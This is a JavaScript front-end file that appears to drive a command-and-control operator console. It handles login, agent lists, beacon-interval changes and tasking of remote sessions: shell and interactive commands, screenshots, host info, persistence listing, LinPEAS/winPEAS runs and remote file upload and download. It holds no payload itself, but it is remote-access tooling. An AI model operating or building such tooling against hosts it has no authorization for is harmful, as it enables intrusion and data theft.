'use strict';

let token = null;

let activeAgentID = null;

let activeAgent = null;

let seenTaskIDs = new Set();

let currentOutputs = [];

let pendingUploadFile = null;

let taskHistory = [];

let taskHistoryIndex = -1;

let taskDrafts = new Map();

let interactiveHistory = [];

let interactiveHistoryIndex = -1;

let interactiveMode = false;

let interactiveReady = false;

let sseReader = null;

let sseStreamID = 0;

let outputsRequestID = 0;

let agentsPollTimer = null;

let authExpiryTimer = null;

let allAgents = [];

let selectedAgentIDs = new Set();

let bulkSelectionMode = false;

let selectedTaskType = 'shell';

let taskRequestInFlight = false;

let killConfirmTimer = null;

let armedKillAgentID = null;

let pendingClearAgentID = '';

let hasHydratedOutputs = false;

let followOutput = true;

let pendingPathCompletion = null;

let queuedCompletionPath = '';

let pathCompletionTimer = null;

let pathBrowseStates = new Map();

let deferredPathCompletionOutputs = new Map();

let deferredPathBrowseOutputs = new Map();

let artifactLibrary = [];

let auditLog = [];

let activeSessionPanel = 'timeline';

let fileBrowserPath = '';

let fileBrowserResult = null;

let fileBrowserMode = 'browse';

let pendingKillAgentID = '';

let outputSearchExpanded = false;

let outputTypeFilter = 'all';

let downloadTasks = new Map();

let outputRowSeq = 0;

let taskTypeSearchInput = null;

const MAX_LOGIN_BODY_BYTES = 4096;

const MAX_UPLOAD_BYTES = 50 * 1024 * 1024;

const MAX_SLEEP_SECONDS = 24 * 60 * 60;

const MAX_REMOTE_PATH = 4096;

const POLL_INTERVAL_MS = 5000;

const KILL_CONFIRM_WINDOW_MS = 10000;

const OUTPUT_FOLLOW_THRESHOLD_PX = 40;

const PATH_COMPLETION_DEBOUNCE_MS = 150;

const PATH_BROWSE_RENEW_MS = 60 * 1000;

const PATH_BROWSE_FAST_WINDOW_MS = 2 * 60 * 1000;

const PENDING_TASK_ID = '__pending__';

const TASK_GROUPS = [
  { label: 'Command', types: ['shell', 'interactive'] },
  { label: 'Situational', types: ['ps', 'snapshot', 'persistence', 'screenshot', 'peas'] },
  { label: 'Files', types: ['download', 'upload'] },
  { label: 'Session', types: ['sleep', 'kill'] },
];

const BULK_TASK_TYPES = new Set(['shell', 'ps', 'screenshot', 'snapshot', 'persistence', 'peas', 'sleep']);

const TASK_TYPES = {
  shell: {
    buttonLabel: 'Queue Shell',
    help: 'Queue a single shell command for the selected session.',
    note: 'Shell payloads stay in memory only and are still server-side validated before queueing.',
    placeholder: 'Enter a shell command',
    requiresPayload: true,
    inputMode: 'text',
  },
  ps: {
    buttonLabel: 'Queue PS',
    help: 'List running processes for the selected session.',
    note: 'Process listing is a read-only, one-shot situational awareness task.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
  screenshot: {
    buttonLabel: 'Take Screenshot',
    help: 'Capture one bounded screenshot from the selected session.',
    note: 'Screenshots are operator-initiated, downsampled, and delivered as bounded chunks.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
  snapshot: {
    buttonLabel: 'Queue Host Info',
    help: 'Collect a host information report from the selected session.',
    note: 'Host Info returns identity, network, route, disk, and environment basics as a text artifact.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
  persistence: {
    buttonLabel: 'Check Persistence',
    help: 'List common persistence locations for defensive review.',
    note: 'Persistence detection reads common autorun locations and does not modify them.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
  peas: {
    buttonLabel: 'Run PEAS',
    help: 'Run LinPEAS or winPEAS based on the selected session OS.',
    note: 'PEAS output is captured as a text artifact and returned through chunked results.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
  download: {
    buttonLabel: 'Queue Download',
    help: 'Request a remote file path and receive the result as a browser download.',
    note: 'Path suggestions are prepared automatically. Use Browse to open the remote file browser and download files directly.',
    placeholder: 'Enter a remote file path',
    requiresPayload: true,
    inputMode: 'text',
  },
  upload: {
    buttonLabel: 'Queue Upload',
    help: 'Send a local file to a remote destination path on the selected session.',
    note: 'Path suggestions are prepared automatically. Pick a file with Choose File or Browse remote directories to set the destination.',
    placeholder: 'Enter a remote destination path',
    requiresPayload: true,
    inputMode: 'text',
  },
  sleep: {
    buttonLabel: 'Queue Sleep',
    help: 'Update the beacon interval in seconds.',
    note: 'Sleep values must be whole seconds between 1 and 86400.',
    placeholder: 'Enter seconds between 1 and 86400',
    requiresPayload: true,
    inputMode: 'numeric',
  },
  kill: {
    buttonLabel: 'Queue Kill',
    help: 'Terminate the selected session after it processes the task.',
    note: 'Kill requires a second confirmation click and does not accept an additional payload.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
  interactive: {
    buttonLabel: 'Start Interactive',
    help: 'Open a near-real-time shell view for the selected session.',
    note: 'Interactive mode temporarily increases beacon frequency while it is active.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
};

const $ = id => document.getElementById(id);

const taskTypeButtons = Array.from(document.querySelectorAll('[data-task-type]'));

const taskTypeSelect = $('task-type-select');

const taskTypeMenu = $('task-type-menu');

const taskTypeButton = $('task-type-button');

const taskTypeButtonLabel = $('task-type-button-label');

const taskTypeList = $('task-type-list');

const sessionPanelTabs = Array.from(document.querySelectorAll('.session-tab'));

const sessionPanelFilter = $('session-panel-filter');

const outputShellEl = $('output-shell');

const outputResizerEl = $('output-resizer');

const outputEmptyTitle = $('output-empty').querySelector('h3');

const outputEmptyText = $('output-empty').querySelector('p');

const outputTypeFilterEl = $('output-type-filter');

const outputTypeMenu = $('output-type-menu');

const outputTypeButton = $('output-type-button');

const outputTypeButtonLabel = $('output-type-button-label');

const outputTypeList = $('output-type-list');

$('password').addEventListener('input', () => {
  setLoginError('');
});

$('login-form').addEventListener('submit', async event => {
  event.preventDefault();

  const password = $('password').value;
  if (!password) {
    setLoginError('Enter the operator password.');
    $('password').focus();
    return;
  }

  const body = buildLoginBody(password);
  if (!body) {
    setLoginError('Password exceeds the maximum supported request size.');
    $('password').focus();
    return;
  }

  setLoginError('');
  setLoginPending(true);

  try {
    const resp = await apiFetch('/api/auth/login', {
      method: 'POST',
      body,
    });

    if (!resp.ok) {
      if (resp.status === 401) setLoginError('Wrong password');
      else if (resp.status === 429) setLoginError(loginThrottleMessage(resp));
      else setLoginError('Login failed (' + resp.status + ')');
      setLoginPending(false);
      return;
    }

    const data = await resp.json();
    setLoginPending(false);
    beginSession(data.token);
  } catch (_) {
    setLoginError('Network error. Check the browser console (F12).');
    setLoginPending(false);
  }
});

$('logout-btn').addEventListener('click', () => {
  setLoggedOutState('');
});

$('agent-filter').addEventListener('input', renderAgentList);

$('bulk-select-mode-btn').addEventListener('click', () => {
  setBulkSelectionMode(!bulkSelectionMode);
});

taskTypeButtons.forEach(button => {
  button.addEventListener('click', () => setTaskType(button.dataset.taskType));
});

if (taskTypeSelect) {
  taskTypeSelect.addEventListener('change', () => setTaskType(taskTypeSelect.value));
}

initTaskTypeMenu();

sessionPanelTabs.forEach(button => {
  button.addEventListener('click', () => setSessionPanel(button.dataset.panel));
});

if (sessionPanelFilter) {
  sessionPanelFilter.addEventListener('change', () => setSessionPanel(sessionPanelFilter.value));
}

$('output-search-toggle').addEventListener('click', () => updateOutputSearchUI(!outputSearchExpanded));

initOutputTypeMenu();

if (outputTypeFilterEl) {
  outputTypeFilterEl.addEventListener('change', () => {
    setOutputTypeFilter(outputTypeFilterEl.value || 'all', false);
  });
}

$('session-details-btn').addEventListener('click', openSessionDetailsModal);

$('session-details-close-btn').addEventListener('click', closeSessionDetailsModal);

document.querySelector('[data-close-session-details]').addEventListener('click', closeSessionDetailsModal);

$('file-browser-close-btn').addEventListener('click', closeFileBrowserModal);

document.querySelector('[data-close-file-browser]').addEventListener('click', closeFileBrowserModal);

$('clear-cancel-btn').addEventListener('click', closeClearConfirmModal);

document.querySelector('[data-close-clear-confirm]').addEventListener('click', closeClearConfirmModal);

$('clear-confirm-btn').addEventListener('click', confirmClearOutput);

$('kill-cancel-btn').addEventListener('click', closeKillConfirmModal);

document.querySelector('[data-close-kill-confirm]').addEventListener('click', closeKillConfirmModal);

$('kill-confirm-btn').addEventListener('click', confirmKillSession);

initDraggableModals();

$('task-input').addEventListener('input', () => {
  clearTaskInputError();
  saveActiveTaskDraft();
  if (pathSuggestionTaskSelected() && !interactiveMode) {
    schedulePathCompletion();
  } else {
    hidePathSuggestions();
  }
});

$('send-btn').addEventListener('click', sendTask);

$('bulk-send-btn').addEventListener('click', sendBulkTask);

$('bulk-clear-btn').addEventListener('click', () => {
  selectedAgentIDs.clear();
  renderAgentList();
  updateBulkSelectionUI();
});

$('cancel-task-btn').addEventListener('click', () => {
  const taskID = $('cancel-task-select').value;
  if (taskID) queueCancelTask(taskID);
});

$('cancel-task-select').addEventListener('change', updateCancellationControls);

$('save-metadata-btn').addEventListener('click', async () => {
  if (!activeAgentID) return;
  const tags = $('tag-input').value.split(',').map(tag => tag.trim()).filter(Boolean);
  try {
    const resp = await apiFetch('/api/agents/' + activeAgentID + '/metadata', {
      method: 'PUT',
      body: JSON.stringify({ notes: $('notes-input').value, tags }),
    });
    if (!resp.ok) {
      appendOutput('[-] save notes failed (' + resp.status + ')');
      return;
    }
    activeAgent = await resp.json();
    allAgents = allAgents.map(agent => agent.id === activeAgentID ? { ...agent, ...activeAgent } : agent);
    appendOutput('[>] notes saved');
    renderAgentList();
    renderSessionPanels();
  } catch (err) {
    appendOutput('[-] save notes error: ' + err.message);
  }
});

$('output-search').addEventListener('input', applyOutputSearch);

$('task-input').addEventListener('keydown', e => {
  if (e.key === 'Enter') {
    sendTask();
    return;
  }

  if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (interactiveMode) navigateInteractiveHistory(-1);
    else navigateTaskHistory(-1);
    return;
  }

  if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (interactiveMode) navigateInteractiveHistory(1);
    else navigateTaskHistory(1);
  }
});

document.addEventListener('keydown', e => {
  if (e.defaultPrevented) return;

  if (e.key === '/' && !$('main-view').hidden && !isTypingTarget(document.activeElement)) {
    e.preventDefault();
    $('agent-filter').focus();
    $('agent-filter').select();
    return;
  }

  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k' && !$('main-view').hidden) {
    e.preventDefault();
    focusPrimaryInput(true);
    return;
  }

  if (e.key !== 'Escape') return;

  if (!$('clear-confirm-modal').hidden) {
    e.preventDefault();
    closeClearConfirmModal();
    return;
  }

  if (!$('kill-confirm-modal').hidden) {
    e.preventDefault();
    closeKillConfirmModal();
    return;
  }

  if (!$('session-details-modal').hidden) {
    e.preventDefault();
    closeSessionDetailsModal();
    $('session-details-btn').focus();
    return;
  }

  if (!$('file-browser-modal').hidden) {
    e.preventDefault();
    closeFileBrowserModal();
    $('send-btn').focus();
    return;
  }

  if (outputSearchExpanded && document.activeElement === $('output-search')) {
    e.preventDefault();
    updateOutputSearchUI(false);
    $('output-search-toggle').focus();
    return;
  }

  if (selectedTaskType === 'upload' && pendingUploadFile) {
    e.preventDefault();
    clearPendingUpload();
    return;
  }

  if (killConfirmationActive()) {
    e.preventDefault();
    clearKillConfirmation();
    applyTaskTypeUI();
    updateTaskContextStatus();
  }
});

$('save-output-btn').addEventListener('click', saveRenderedOutputArtifact);

$('clear-btn').addEventListener('click', openClearConfirmModal);

$('exit-interactive-btn').addEventListener('click', () => exitInteractiveMode(true));

$('choose-file-btn').addEventListener('click', () => {
  if (selectedTaskType !== 'upload' || !activeAgentID || taskRequestInFlight) return;
  $('upload-file-input').click();
});

$('upload-file-input').addEventListener('change', () => {
  const file = $('upload-file-input').files[0];
  if (file) acceptUploadFile(file);
  $('upload-file-input').value = '';
});

$('browse-path-btn').addEventListener('click', () => {
  if ((selectedTaskType !== 'upload' && selectedTaskType !== 'download') || !activeAgentID || taskRequestInFlight) return;
  if (selectedTaskType === 'upload' && !pendingUploadFile) {
    setTaskInputError('Choose a local file before browsing for an upload destination.');
    return;
  }
  if (!activePathBrowseReady()) {
    setTaskInputError('The remote path browser is still preparing. Try again when the session confirms readiness.');
    return;
  }
  openFileBrowserModal(selectedTaskType === 'upload' ? 'select-upload' : 'browse');
});

const outputEl = $('output');

$('jump-latest-btn').addEventListener('click', () => {
  scrollOutputToBottom();
});

if (outputResizerEl) {
  let resizeStartY = 0;
  let resizeStartHeight = 0;

  outputResizerEl.addEventListener('pointerdown', event => {
    if (!activeAgentID) return;
    event.preventDefault();
    resizeStartY = event.clientY;
    resizeStartHeight = outputShellEl.getBoundingClientRect().height;
    outputResizerEl.classList.add('dragging');
    outputResizerEl.setPointerCapture(event.pointerId);
  });

  outputResizerEl.addEventListener('pointermove', event => {
    if (!outputResizerEl.classList.contains('dragging')) return;
    const nextHeight = resizeStartHeight + (event.clientY - resizeStartY);
    setOutputPaneHeight(nextHeight);
  });

  outputResizerEl.addEventListener('pointerup', event => {
    outputResizerEl.classList.remove('dragging');
    try {
      outputResizerEl.releasePointerCapture(event.pointerId);
    } catch (_) {
      // Pointer capture may already be released by the browser.
    }
  });

  outputResizerEl.addEventListener('pointercancel', () => {
    outputResizerEl.classList.remove('dragging');
  });

  outputResizerEl.addEventListener('dblclick', () => {
    outputShellEl.style.flex = '';
    outputShellEl.style.height = '';
  });

  window.addEventListener('resize', () => {
    if (!outputShellEl.style.height) return;
    setOutputPaneHeight(outputShellEl.getBoundingClientRect().height);
  });
}

outputEl.addEventListener('scroll', () => {
  followOutput = isOutputNearBottom();
  updateOutputControls();
});

outputEl.addEventListener('dragover', e => {
  if (!activeAgentID || interactiveMode) return;
  e.preventDefault();
  outputEl.classList.add('drag-over');
});

outputEl.addEventListener('dragleave', e => {
  if (!e.relatedTarget || !outputEl.contains(e.relatedTarget)) {
    outputEl.classList.remove('drag-over');
  }
});

outputEl.addEventListener('drop', e => {
  if (!activeAgentID || interactiveMode) return;
  e.preventDefault();
  outputEl.classList.remove('drag-over');
  const file = e.dataTransfer.files[0];
  if (file) acceptUploadFile(file);
});

let crcTable = null;

applyTaskTypeUI();

updateOutputControls();

updateOutputEmptyState();
